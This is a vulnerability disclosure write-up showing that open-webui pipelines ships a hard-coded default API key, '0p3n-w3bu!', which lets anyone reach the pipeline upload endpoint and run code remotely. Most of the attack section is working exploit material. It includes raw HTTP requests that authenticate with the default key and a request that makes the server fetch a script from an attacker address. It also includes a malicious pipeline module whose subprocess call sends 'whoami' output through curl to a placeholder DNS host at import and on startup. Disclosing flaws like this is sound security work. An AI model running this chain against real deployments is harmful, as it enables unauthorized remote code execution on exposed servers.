# open-webui-pipelines Hard-coded permission bypass leads to RCE

**BUG_Author:** H2u8s

**Affected Version:** All Version 

**Vendor:** https://github.com/open-webui/pipelines


**Vulnerability Files:**
- https://github.com/open-webui/pipelines/blob/main/config.py#L23
- https://github.com/open-webui/pipelines/blob/main/main.py#L387C1-L387C31


Similar to CVE-2025-30206, CVE-2024-11619, and CVE-2024-52295, the software repository does not enforce changes to the default authentication key, thus leading to its misuse.

<img width="1761" height="1038" alt="图片" src="https://github.com/user-attachments/assets/3b8bd7d0-b712-47ee-84e6-5aca901c5129" />

There are many instances where this service is deployed on the public internet.

Hard-coded permission bypass leads to RCE


https://github.com/open-webui/pipelines/blob/main/config.py#L23

<img width="1933" height="1053" alt="图片" src="https://github.com/user-attachments/assets/f8a83efa-0457-45ba-858f-08224aae0f84" />

The open-source code hardcodes the `0p3n-w3bu!` key. If operations and maintenance personnel lack security awareness, they may forget to modify it, leading to authentication being bypassed.

Here, I'll use the vendor's Docker deployment commands to explain how I bypassed this authentication to launch a Pipelines RCE attack.

I'll directly use the officially recommended deployment code.


```
docker run -d -p 9099:9099 --add-host=host.docker.internal:host-gateway -v pipelines:/app/pipelines --name pipelines --restart always ghcr.io/open-webui/pipelines:main
```
<img width="1733" height="1191" alt="图片" src="https://github.com/user-attachments/assets/9f351c2b-39ff-47c6-ad4e-1841df74f95f" />

Deployment successful. Accessing port 9099 will display {"status":true}.


<img width="1562" height="1166" alt="图片" src="https://github.com/user-attachments/assets/229c9cf0-0c97-499f-b91d-73dc906bfe71" />

Accessing the `/pipelines` interface directly will result in an unauthorized message.


<img width="463" height="245" alt="图片" src="https://github.com/user-attachments/assets/191387f9-c5d9-4f1d-a722-0e94e537633b" />

Pipelines use the `Authorization:` field for authentication.


```PYTHON
def get_current_user(
    credentials: HTTPAuthorizationCredentials = Depends(bearer_security),
) -> Optional[dict]:
    token = credentials.credentials

    if token != API_KEY:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid API key",
        )

    return token
```

- The Bearer token is obtained through `credentials: HTTPAuthorizationCredentials = Depends(bearer_security)`.
- The token = credentials.credentials, which is compared with API_KEY; if they are different, a 401 error is thrown.


The default value for API_KEY is the aforementioned ``0p3n-w3bu!``

When we send HTTP packets as follows, we can bypass authentication.



```
GET /pipelines HTTP/1.1 
Host: 127.0.0.1:9099 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Accept-Encoding: gzip, deflate 
Accept: */* 
Connection: keep-alive 
Authorization: Bearer 0p3n-w3bu!
```
Data was successfully returned to the backend.


<img width="1396" height="444" alt="图片" src="https://github.com/user-attachments/assets/2a888b8d-17d6-444b-a519-a526e8e0b3ac" />

https://github.com/open-webui/pipelines/blob/main/main.py#L153C1-L155C40


<img width="1052" height="895" alt="图片" src="https://github.com/user-attachments/assets/67cab21e-cc89-4651-9b6d-167c13374367" />


- Dynamically import and execute the module's top-level code: pipelines/main.py (line 153) uses `spec.loader.exec_module(module)` to load the `.py` files you place in `PIPELINES_DIR`. Any Python code at the top level of the module will be executed immediately upon import.

There are two ways to upload files here; we'll use the `add` function to perform RCE (Remote Code Execution).


https://github.com/open-webui/pipelines/blob/main/main.py#L387C1-L387C31

```PYTHON
@app.post("/v1/pipelines/add")
@app.post("/pipelines/add")
async def add_pipeline(
    form_data: AddPipelineForm, user: str = Depends(get_current_user)
):
    if user != API_KEY:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid API key",
        )

    try:
        url = convert_to_raw_url(form_data.url)

        print(url)
        file_path = await download_file(url, dest_folder=PIPELINES_DIR)
        await reload()
        return {
            "status": True,
            "detail": f"Pipeline added successfully from {file_path}",
        }
    except HTTPException as e:
        raise e
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=str(e),
        )
```


```HTTP
POST /v1/pipelines/add  HTTP/1.1
Host: 127.0.0.1:9099
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Authorization: Bearer 0p3n-w3bu!
Content-Type: application/json

{"url":"http://{remote_addr}/1.py"}
```

We uploaded our malicious Python script onto the remote server.

```PYTHON
from typing import List, Union, Generator, Iterator, Optional
import subprocess
import os

class Pipeline:
    def __init__(self):
        self.name = "Calculator Exploit"
        self.description = "Demonstrates code execution by launching a DNS Query"
        self.debug = True
        self.execute_payload()
    def execute_payload(self):
        try:
            subprocess.Popen('curl `whoami`.{your_dns_addr}', shell=True)
            print("DNS Query payload executed!")
        except Exception as e:
            print(f"Error executing payload: {e}")
    async def on_startup(self):
        print("on_startup - additional payload")
        self.execute_payload()
    async def on_shutdown(self):
        print("on_shutdown")
    async def inlet(self, body: dict, user: Optional[dict] = None) -> dict:
        return body
    async def outlet(self, body: dict, user: Optional[dict] = None) -> dict:
        return body
    def pipe(self, user_message: str, model_id: str, messages: List[dict], body: dict):
        yield f"DNS Query exploit completed for: {user_message}"
print("Module imported - executing payload...")
try:
    subprocess.Popen('curl `whoami`.{your_dns_addr}'', shell=True)
except:
    pass
```

<img width="1728" height="1026" alt="图片" src="https://github.com/user-attachments/assets/d6901264-40cf-43ac-8402-9dcc765584d9" />

RCE successful.
